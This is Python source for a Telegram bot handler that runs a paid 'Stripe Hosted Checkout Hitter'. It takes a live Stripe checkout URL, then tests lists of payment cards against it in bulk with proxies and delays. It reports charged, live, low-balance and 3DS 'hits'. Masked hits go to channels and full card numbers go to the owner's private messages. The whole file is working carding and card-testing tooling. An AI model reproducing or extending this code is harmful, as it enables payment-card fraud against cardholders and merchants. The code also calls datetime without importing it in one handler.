"""
handlers/stripe_hosted_handler.py
/stmode — Stripe Hosted Checkout Hitter Mode
/stproxy — Set proxy for hosted hitter (optional)

Flow:
  /stmode → bot asks for checkout URL
  User sends URL → bot loads session (PK, amount, merchant)
  Bot asks for cards (one by one or .txt file)
  Bot hits each card with 2s delay, shows live results
  /ststop or STOP button → stops session
  If checkout expires → notifies user, asks for new URL
"""
import asyncio
import io
import logging
import os
import re
import time
import uuid

from pyrogram import Client, filters, enums
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton

import config
import database.db as db
from core.parser import parse_cc, parse_mass
from gateways.stripe_hosted_gate import (
    HostedSessionData,
    HostedCheckResult,
    extract_hosted_session,
    check_stripe_hosted,
)

logger = logging.getLogger("CC-Checker.StripeHosted")

# ── Per-user state ──────────────────────────────────────────────────────────
# States: "waiting_url" | "waiting_cards" | "checking" | None
_state:        dict[int, str]                    = {}
_session_data: dict[int, HostedSessionData]      = {}
_proxy:        dict[int, str | None]             = {}
_stop_events:  dict[int, asyncio.Event]          = {}
_session_ids:  dict[int, str]                    = {}  # for stop button


def _has_access(user_id: int, plan_info: dict) -> bool:
    """Same access as /st /mst: owner OR paid plan."""
    if user_id in config.OWNER_IDS:
        return True
    return plan_info.get("plan") not in (None, "", "free")


def _fmt_amount(amount: int, currency: str) -> str:
    """Format amount in smallest unit to display string."""
    currency = (currency or "INR").upper()
    symbol_map = {"INR": "₹", "USD": "$", "EUR": "€", "GBP": "£"}
    sym = symbol_map.get(currency, currency + " ")
    return f"{sym}{amount/100:,.2f}"


def _status_emoji(status: str) -> str:
    return {
        "APPROVED": "✅", "3DS": "🔐", "INSUFFICIENT": "⚠️",
        "DECLINED": "❌", "DEAD": "❌", "EXPIRED": "⏰",
        "ERROR": "❓", "MISMATCH": "⚠️",
    }.get(status, "❓")


def register_stripe_hosted_handler(app: Client):
    """Register /stmode, /stproxy, /ststop commands."""

    # ─────────────────────────────────────────────────────────────────
    # /stproxy — Set proxy for this hitter (optional)
    # ─────────────────────────────────────────────────────────────────
    @app.on_message(filters.command("stproxy"))
    async def cmd_stproxy(client: Client, msg: Message):
        user_id = msg.from_user.id
        plan_info = await db.get_user_plan(user_id)
        if not _has_access(user_id, plan_info):
            await msg.reply("🚫 <b>Access Denied!</b>", parse_mode=enums.ParseMode.HTML)
            return

        parts = msg.text.strip().split(maxsplit=1)
        if len(parts) < 2:
            current = _proxy.get(user_id) or "None"
            await msg.reply(
                f"🌐 <b>Stripe Hosted Proxy</b>\n"
                f"Current: <code>{current}</code>\n\n"
                f"<b>Set proxy:</b> <code>/stproxy http://user:pass@host:port</code>\n"
                f"<b>Remove:</b> <code>/stproxy none</code>",
                parse_mode=enums.ParseMode.HTML
            )
            return

        proxy_str = parts[1].strip()
        if proxy_str.lower() == "none":
            _proxy[user_id] = None
            await msg.reply("✅ <b>Proxy removed.</b>", parse_mode=enums.ParseMode.HTML)
        else:
            _proxy[user_id] = proxy_str
            await msg.reply(
                f"✅ <b>Proxy set:</b>\n<code>{proxy_str}</code>",
                parse_mode=enums.ParseMode.HTML
            )

    # ─────────────────────────────────────────────────────────────────
    # /ststop — Stop active hitter session
    # ─────────────────────────────────────────────────────────────────
    @app.on_message(filters.command("ststop"))
    async def cmd_ststop(client: Client, msg: Message):
        user_id = msg.from_user.id
        ev = _stop_events.get(user_id)
        if ev and not ev.is_set():
            ev.set()
            _state.pop(user_id, None)
            await msg.reply("🛑 <b>Hitter session stopped!</b>", parse_mode=enums.ParseMode.HTML)
        else:
            await msg.reply("⚠️ <b>No active hitter session.</b>", parse_mode=enums.ParseMode.HTML)

    # ─────────────────────────────────────────────────────────────────
    # STOP button callback
    # ─────────────────────────────────────────────────────────────────
    @app.on_callback_query(filters.create(
        lambda _, __, cb: cb.data and cb.data.startswith("stmode_stop_")
    ))
    async def _stmode_stop_cb(client: Client, cb):
        try:
            parts = cb.data.split("_")
            user_id = int(parts[2])
            # Only the session owner can stop
            if cb.from_user.id != user_id and cb.from_user.id not in config.OWNER_IDS:
                await cb.answer("❌ Not your session!", show_alert=True)
                return
            ev = _stop_events.get(user_id)
            if ev and not ev.is_set():
                ev.set()
                _state.pop(user_id, None)
                await cb.answer("🛑 Stopped!", show_alert=True)
                try:
                    await cb.message.edit_reply_markup(None)
                except Exception:
                    pass
            else:
                await cb.answer("Session already ended.")
        except Exception as e:
            await cb.answer(f"Error: {e}")

    # ─────────────────────────────────────────────────────────────────
    # /stmode — Enter hitter mode
    # ─────────────────────────────────────────────────────────────────
    @app.on_message(filters.command("stmode"))
    async def cmd_stmode(client: Client, msg: Message):
        user_id = msg.from_user.id
        plan_info = await db.get_user_plan(user_id)

        if not _has_access(user_id, plan_info):
            await msg.reply(
                "❌ <b>Access Denied!</b>\n"
                "You need an active subscription to use <code>/stmode</code>.\n"
                "Contact the owner for access.",
                parse_mode=enums.ParseMode.HTML
            )
            return

        # Clear any existing session
        ev = _stop_events.get(user_id)
        if ev:
            ev.set()
        _stop_events[user_id] = asyncio.Event()
        _state[user_id] = "waiting_url"
        _session_data.pop(user_id, None)

        proxy_display = _proxy.get(user_id) or "None (direct)"
        await msg.reply(
            "⚡ <b>Stripe Hosted Checkout — Hitter Mode</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "<blockquote>"
            "🎯 <b>Gate:</b> <code>Stripe Hosted Checkout</code>\n"
            "⚡ <b>Engine:</b> <code>Direct API (No browser per card)</code>\n"
            f"🌐 <b>Proxy:</b> <code>{proxy_display}</code>\n"
            "⏱ <b>Delay:</b> <code>2s between cards</code>"
            "</blockquote>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📎 <b>Send the Stripe Checkout URL:</b>\n"
            "<i>Example: https://checkout.stripe.com/c/pay/cs_live_...</i>\n\n"
            "💡 <i>Tip: Set proxy with /stproxy | Stop with /ststop</i>",
            parse_mode=enums.ParseMode.HTML
        )

    # ─────────────────────────────────────────────────────────────────
    # Message handler — handles all conversation states
    # ─────────────────────────────────────────────────────────────────
    @app.on_message(filters.text & ~filters.command(["stmode", "ststop", "stproxy"]))
    async def _stmode_conversation(client: Client, msg: Message):
        user_id = msg.from_user.id
        state = _state.get(user_id)

        if not state:
            return  # Not in stmode — ignore

        text = msg.text.strip().lstrip('\ufeff')

        # ── State: WAITING_URL ───────────────────────────────────────
        if state == "waiting_url":
            if "cs_live_" not in text and "checkout.stripe.com" not in text:
                await msg.reply(
                    "❌ <b>Invalid URL!</b>\n"
                    "Send a valid Stripe Checkout URL starting with <code>cs_live_</code>",
                    parse_mode=enums.ParseMode.HTML
                )
                return

            wait = await msg.reply(
                "🔄 <b>Loading checkout session...</b>\n"
                "<i>Extracting PK, amount, merchant info...</i>",
                parse_mode=enums.ParseMode.HTML
            )

            try:
                data = await extract_hosted_session(text)
            except Exception as e:
                await wait.edit_text(
                    f"❌ <b>Failed to load session!</b>\n<code>{e}</code>",
                    parse_mode=enums.ParseMode.HTML
                )
                return

            if not data:
                await wait.edit_text(
                    "❌ <b>Could not extract session data!</b>\n"
                    "• URL might be expired\n"
                    "• Page may have failed to load\n\n"
                    "Try a fresh checkout URL.",
                    parse_mode=enums.ParseMode.HTML
                )
                return

            _session_data[user_id] = data
            _state[user_id] = "waiting_cards"

            amt_display = _fmt_amount(data.amount, data.currency)
            await wait.edit_text(
                "✅ <b>Session Loaded!</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "<blockquote>"
                f"🏪 <b>Merchant:</b> <code>{data.merchant}</code>\n"
                f"💰 <b>Amount:</b> <code>{amt_display}</code>\n"
                f"💳 <b>Mode:</b> <code>{data.mode.title()}</code>\n"
                f"🔑 <b>Session:</b> <code>{data.session_id[:20]}...</code>"
                "</blockquote>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "📤 <b>Now send cards:</b>\n"
                "• One card: <code>4111111111111111|12|2027|123</code>\n"
                "• Multiple cards: send a <code>.txt</code> file\n\n"
                "🛑 Stop anytime with /ststop",
                parse_mode=enums.ParseMode.HTML
            )
            return

        # ── State: WAITING_CARDS (single card) ──────────────────────
        if state == "waiting_cards":
            # Parse card using regex parser
            card_obj = parse_cc(text)
            if not card_obj:
                await msg.reply(
                    "⚠️ <b>Invalid format!</b>\n"
                    "Use: <code>number|mm|yy|cvv</code>\n"
                    "Or send a <code>.txt</code> file with multiple cards.",
                    parse_mode=enums.ParseMode.HTML
                )
                return

            card_str = str(card_obj)

            data = _session_data.get(user_id)
            if not data:
                _state.pop(user_id, None)
                await msg.reply("⚠️ Session expired. Use /stmode again.", parse_mode=enums.ParseMode.HTML)
                return

            stop_ev = _stop_events[user_id]
            if stop_ev.is_set():
                _state.pop(user_id, None)
                await msg.reply("🛑 Session was stopped. Use /stmode to start again.", parse_mode=enums.ParseMode.HTML)
                return

            # Single card check
            _state[user_id] = "checking"
            wait = await msg.reply(
                f"⚡ <b>Checking card...</b>\n<code>{card_obj.number[:6]}xxxxxx{card_obj.number[-4:]}</code>",
                parse_mode=enums.ParseMode.HTML
            )

            result = await check_stripe_hosted(card_str, data, _proxy.get(user_id))
            _state[user_id] = "waiting_cards"

            emoji = _status_emoji(result.status)
            # If expired → go back to URL state
            if result.status == "EXPIRED":
                _state[user_id] = "waiting_url"
                _session_data.pop(user_id, None)
                await wait.edit_text(
                    "⏰ <b>Checkout Session Expired!</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n"
                    "The Stripe checkout URL has expired.\n\n"
                    "📎 <b>Send a fresh checkout URL to continue:</b>",
                    parse_mode=enums.ParseMode.HTML
                )
                return

            await wait.edit_text(
                f"{emoji} <b>{result.status}</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "<blockquote>"
                f"💳 <b>Card:</b> <code>{result.card_display}</code>\n"
                f"💬 <b>Message:</b> <code>{result.message}</code>\n"
                f"🏷 <b>Code:</b> <code>{result.code or 'N/A'}</code>\n"
                f"⏱ <b>Time:</b> <code>{result.time_taken:.1f}s</code>"
                "</blockquote>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "📤 Send next card or .txt file:",
                parse_mode=enums.ParseMode.HTML
            )

            # Forward live hit
            if result.status in ("APPROVED", "INSUFFICIENT", "3DS"):
                try:
                    await _forward_hit(client, msg, result, data)
                except Exception:
                    pass
            return

    # ─────────────────────────────────────────────────────────────────
    # Document handler — .txt file with multiple cards
    # ─────────────────────────────────────────────────────────────────
    @app.on_message(filters.document)
    async def _stmode_document(client: Client, msg: Message):
        user_id = msg.from_user.id
        state = _state.get(user_id)

        if state not in ("waiting_cards", "waiting_url"):
            return

        doc = msg.document
        if not (doc.file_name or "").lower().endswith(".txt"):
            return  # Not a txt file — ignore

        data = _session_data.get(user_id)
        if not data:
            await msg.reply(
                "⚠️ <b>No active session!</b>\n"
                "Use /stmode first and send the checkout URL.",
                parse_mode=enums.ParseMode.HTML
            )
            return

        wait = await msg.reply("📥 <b>Downloading file...</b>", parse_mode=enums.ParseMode.HTML)

        # Download file
        try:
            tmp_path = await client.download_media(doc)
            with open(tmp_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
        except Exception as e:
            await wait.edit_text(f"❌ Failed to read file: <code>{e}</code>", parse_mode=enums.ParseMode.HTML)
            return
        finally:
            try:
                if tmp_path and os.path.exists(tmp_path):
                    os.remove(tmp_path)
            except Exception:
                pass

        # Parse cards using robust regex parser
        card_objs = parse_mass(content)
        cards = [str(c) for c in card_objs]

        if not cards:
            await wait.edit_text(
                "❌ <b>No valid cards found in file!</b>\n"
                "Format: <code>number|mm|yy|cvv</code>",
                parse_mode=enums.ParseMode.HTML
            )
            return

        total = len(cards)
        is_owner = user_id in config.OWNER_IDS
        max_cards = 5000 if is_owner else 500
        if total > max_cards:
            cards = cards[:max_cards]
            total = max_cards

        # Set up session
        stop_ev = asyncio.Event()
        _stop_events[user_id] = stop_ev
        _state[user_id] = "checking"
        sess_uid = uuid.uuid4().hex[:8]
        _session_ids[user_id] = sess_uid

        stop_markup = InlineKeyboardMarkup([[
            InlineKeyboardButton("🛑 STOP", callback_data=f"stmode_stop_{user_id}")
        ]])
        amt_display = _fmt_amount(data.amount, data.currency)

        await wait.edit_text(
            f"🚀 <b>Stripe Hosted Hitter — Starting</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "<blockquote>"
            f"🏪 <b>Merchant:</b> <code>{data.merchant}</code>\n"
            f"💰 <b>Amount:</b> <code>{amt_display}</code>\n"
            f"📋 <b>Cards:</b> <code>{total}</code>\n"
            f"⏱ <b>Delay:</b> <code>2s per card</code>\n"
            f"🌐 <b>Proxy:</b> <code>{_proxy.get(user_id) or 'None'}</code>"
            "</blockquote>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "⏳ <i>Starting checks...</i>",
            parse_mode=enums.ParseMode.HTML,
            reply_markup=stop_markup
        )

        # Stats & log tracking
        done = 0
        approved = 0
        declined = 0
        errors = 0
        hits = []
        all_log_lines = [
            "================================================================================",
            "                     STRIPE HOSTED CHECKOUT RESULTS                            ",
            f" Merchant: {data.merchant} | Amount: {amt_display}",
            f" Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            "================================================================================\n"
        ]
        start_ts = time.monotonic()
        last_edit = 0.0
        proxy = _proxy.get(user_id)

        async def update_progress():
            nonlocal last_edit
            now = time.monotonic()
            if now - last_edit < 3.5:
                return
            last_edit = now
            elapsed = int(now - start_ts)
            pct = int(done / total * 100) if total else 0
            bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
            speed = done / max(elapsed, 1)
            eta = int((total - done) / max(speed, 0.01))
            try:
                await wait.edit_text(
                    f"⚡ <b>Stripe Hosted — Mass Hitting</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n"
                    "<blockquote>"
                    f"🏪 <b>Merchant:</b> <code>{data.merchant}</code>\n"
                    f"📊 <b>Progress:</b> <code>[{bar}] {pct}%</code>\n"
                    f"📋 <b>Checked:</b> <code>{done}/{total}</code>\n"
                    f"💸 <b>Charged/Live:</b> <code>{approved}</code>\n"
                    f"❌ <b>Declined:</b> <code>{declined}</code>\n"
                    f"❓ <b>Errors:</b> <code>{errors}</code>\n"
                    f"⚡ <b>Speed:</b> <code>{speed:.2f} cards/s</code>\n"
                    f"⏱ <b>ETA:</b> <code>{eta}s</code>"
                    "</blockquote>\n"
                    "━━━━━━━━━━━━━━━━━━━━━━",
                    parse_mode=enums.ParseMode.HTML,
                    reply_markup=stop_markup
                )
            except Exception:
                pass

        # Run checks sequentially (2s delay, stateful session)
        session_expired = False
        for card_str in cards:
            if stop_ev.is_set():
                break

            result = await check_stripe_hosted(card_str, data, proxy)
            done += 1

            status_tag = result.status
            msg_str = result.message or "No message"
            all_log_lines.append(f"[{status_tag}] {card_str} | Bank Msg: {msg_str} | Code: {result.code or 'N/A'} | {result.time_taken:.1f}s")

            if result.status == "EXPIRED":
                session_expired = True
                break
            elif result.status == "APPROVED":
                approved += 1
                hits.append(f"💸 CHARGED | {card_str} | {msg_str[:40]} | {result.time_taken:.1f}s")
                try:
                    await _forward_hit(client, msg, result, data)
                except Exception:
                    pass
                # Send live notification
                try:
                    await msg.reply(
                        f"💸 <b>CHARGED HIT FOUND!</b>\n"
                        "<blockquote>"
                        f"💳 <b>Card:</b> <code>{card_str}</code>\n"
                        f"🏦 <b>Bank Msg:</b> <code>{result.message}</code>\n"
                        f"🏪 <b>Merchant:</b> <code>{data.merchant}</code>"
                        "</blockquote>",
                        parse_mode=enums.ParseMode.HTML
                    )
                except Exception:
                    pass
            elif result.status in ("INSUFFICIENT", "3DS"):
                approved += 1
                em = _status_emoji(result.status)
                hits.append(f"{em} {result.status} | {card_str} | {msg_str[:40]} | {result.time_taken:.1f}s")
                try:
                    await _forward_hit(client, msg, result, data)
                except Exception:
                    pass
                # Send live notification for 3DS & NSF
                try:
                    await msg.reply(
                        f"{em} <b>{result.status} HIT!</b>\n"
                        "<blockquote>"
                        f"💳 <b>Card:</b> <code>{card_str}</code>\n"
                        f"🏦 <b>Bank Msg:</b> <code>{result.message}</code>\n"
                        f"🏪 <b>Merchant:</b> <code>{data.merchant}</code>"
                        "</blockquote>",
                        parse_mode=enums.ParseMode.HTML
                    )
                except Exception:
                    pass
            elif result.status in ("DECLINED", "DEAD"):
                declined += 1
            else:
                errors += 1
                logger.error(f"[StripeHosted Error] {card_str[:15]}: {result.message} [{result.code}]")

            await update_progress()
            # 2 second delay
            if done < total and not stop_ev.is_set():
                await asyncio.sleep(2)

        # Final summary
        _state[user_id] = "waiting_url"  # back to URL state for new session
        _session_data.pop(user_id, None)
        elapsed_total = int(time.monotonic() - start_ts)
        stopped = stop_ev.is_set()

        if session_expired:
            summary_extra = "\n⏰ <b>Checkout session expired!</b>\nSend a fresh URL to continue."
        elif stopped:
            summary_extra = "\n🛑 <b>Stopped by user.</b>"
        else:
            summary_extra = "\n✅ <b>All cards checked!</b>"

        all_log_lines.append("\n================================================================================")
        all_log_lines.append(f" Summary: Total={done} | Charged/Live={approved} | Declined={declined} | Errors={errors}")
        all_log_lines.append("================================================================================")

        await wait.edit_text(
            f"{'🛑' if stopped else ('⏰' if session_expired else '🏁')} <b>Stripe Hosted — Done</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "<blockquote>"
            f"🏪 <b>Merchant:</b> <code>{data.merchant}</code>\n"
            f"📋 <b>Checked:</b> <code>{done}/{total}</code>\n"
            f"💸 <b>Charged/Live:</b> <code>{approved}</code>\n"
            f"❌ <b>Declined:</b> <code>{declined}</code>\n"
            f"❓ <b>Errors:</b> <code>{errors}</code>\n"
            f"⏱ <b>Time:</b> <code>{elapsed_total}s</code>"
            "</blockquote>\n"
            "━━━━━━━━━━━━━━━━━━━━━━"
            f"{summary_extra}",
            parse_mode=enums.ParseMode.HTML,
        )

        # Send full results .txt file (contains ALL cards, errors, declined, charged, bank responses)
        if all_log_lines and done > 0:
            full_text = "\n".join(all_log_lines)
            buf = io.BytesIO(full_text.encode("utf-8"))
            buf.name = f"stripe_hosted_results_{done}_cards.txt"
            try:
                await msg.reply_document(
                    document=buf,
                    caption=(
                        f"📄 <b>Stripe Hosted Full Results ({done} Cards)</b>\n"
                        f"💸 Charged/Live: <code>{approved}</code> | ❌ Declined: <code>{declined}</code> | ❓ Errors: <code>{errors}</code>"
                    ),
                    parse_mode=enums.ParseMode.HTML
                )
            except Exception as e:
                logger.error(f"Failed to send results file: {e}")

        # If expired → ask for new URL
        if session_expired:
            _state[user_id] = "waiting_url"
            await msg.reply(
                "⏰ <b>Session Expired!</b>\n"
                "📎 Send a fresh Stripe Checkout URL to continue hitting:",
                parse_mode=enums.ParseMode.HTML
            )


async def _forward_hit(client: Client, msg: Message, result: HostedCheckResult, data: HostedSessionData):
    """Forward Stripe Hosted hits: masked to group/channel, unmasked to owner DM."""
    try:
        from datetime import datetime
        import database.db as db

        user     = msg.from_user
        user_id  = user.id
        username = user.username or ""
        fname    = user.first_name or "User"
        mention  = f"@{username}" if username else fname

        # Plan badge
        plan_info  = await db.get_user_plan(user_id)
        plan_name  = plan_info["plan"].upper()
        if user_id in config.OWNER_IDS:
            plan_badge = "👑 Owner"
        elif plan_name == "FREE":
            plan_badge = "🆓 Free Plan"
        else:
            plan_badge = f"💎 {plan_name} Plan"

        # Status styling
        st = result.status.upper() if isinstance(result.status, str) else str(result.status)
        if "APPROVED" in st or "CHARGED" in st:
            status_emoji  = "💸"
            status_styled = "𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ✔"
            hit_banner    = "💳 <b>STRIPE HOSTED — CHARGED 🔥</b>"
        elif "3DS" in st or "VBV" in st or "CHALLENGE" in st:
            status_emoji  = "🔐"
            status_styled = "𝗟𝗜𝗩𝗘 — 3𝗗𝗦"
            hit_banner    = "🔐 <b>STRIPE HOSTED — LIVE [ 3DS ]</b>"
        elif "INSUFFICIENT" in st or "NSF" in st:
            status_emoji  = "💰"
            status_styled = "𝗟𝗜𝗩𝗘 — 𝗡𝗦𝗙"
            hit_banner    = "💰 <b>STRIPE HOSTED — LIVE [ LOW BALANCE ]</b>"
        else:
            status_emoji  = "🎯"
            status_styled = "𝗟𝗜𝗩𝗘"
            hit_banner    = "🎯 <b>STRIPE HOSTED — LIVE HIT</b>"

        amount_str = _fmt_amount(data.amount, data.currency)
        resp_msg   = (result.message or "")[:80]
        now_str    = datetime.now().strftime("%H:%M:%S")

        # card_display = "411111xxxxxx1111|12|2026|xxx"
        card_display = result.card_display or "N/A"
        # Try to reconstruct full card from raw_card if available
        raw = getattr(result, "raw_card", None) or card_display

        # ── GROUP / CHANNEL message (NO card, NO CVV) ──────────────────────
        hit_text_masked = (
            f"{hit_banner}\n"
            f"<b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>\n"
            f"<blockquote expandable>"
            f"{status_emoji} <b>Status  »</b> <code>{status_styled}</code>\n"
            f"🏪 <b>Merchant »</b> <code>{data.merchant}</code>\n"
            f"💵 <b>Amount  »</b> <code>{amount_str}</code>\n"
            f"🏦 <b>Bank Msg »</b> <code>{resp_msg}</code>\n"
            f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            f"👤 <b>Hunter  »</b> {mention} {plan_badge}\n"
            f"🕐 <b>Time    »</b> <code>{now_str}</code>"
            f"</blockquote>\n"
            f"<i>⚡ @smilecc_bot</i>"
        )

        # ── OWNER DM (full card display + details) ─────────────────────────
        hit_text_owner = (
            f"{hit_banner}\n"
            f"<b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>\n"
            f"<blockquote expandable>"
            f"{status_emoji} <b>Status  »</b> <code>{status_styled}</code>\n"
            f"💳 <b>Card    »</b> <code>{raw}</code>\n"
            f"🏪 <b>Merchant »</b> <code>{data.merchant}</code>\n"
            f"💵 <b>Amount  »</b> <code>{amount_str}</code>\n"
            f"🏦 <b>Bank Msg »</b> <code>{resp_msg}</code>\n"
            f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            f"👤 <b>Hunter  »</b> {mention} (<code>{user_id}</code>) {plan_badge}\n"
            f"🕐 <b>Time    »</b> <code>{now_str}</code>"
            f"</blockquote>"
        )

        # 1. Hit Channel (masked)
        if config.HIT_CHANNEL_ID:
            try:
                await client.send_message(
                    chat_id=config.HIT_CHANNEL_ID,
                    text=hit_text_masked,
                    parse_mode=enums.ParseMode.HTML
                )
            except Exception as e:
                logger.warning(f"[StripeHosted] Failed to send to channel: {e}")

        # 2. Free Group (masked)
        free_group = await db.get_setting("free_group_id")
        if free_group:
            try:
                await client.send_message(
                    chat_id=int(free_group) if free_group.replace("-", "").isdigit() else free_group,
                    text=hit_text_masked,
                    parse_mode=enums.ParseMode.HTML
                )
            except Exception as e:
                logger.warning(f"[StripeHosted] Failed to send to group: {e}")

        # 3. Owner DM (full card)
        if config.OWNER_IDS:
            try:
                await client.send_message(
                    chat_id=config.OWNER_IDS[0],
                    text=hit_text_owner,
                    parse_mode=enums.ParseMode.HTML
                )
            except Exception as e:
                logger.warning(f"[StripeHosted] Failed to DM owner: {e}")

    except Exception as e:
        logger.error(f"[StripeHosted] _forward_hit error: {e}")
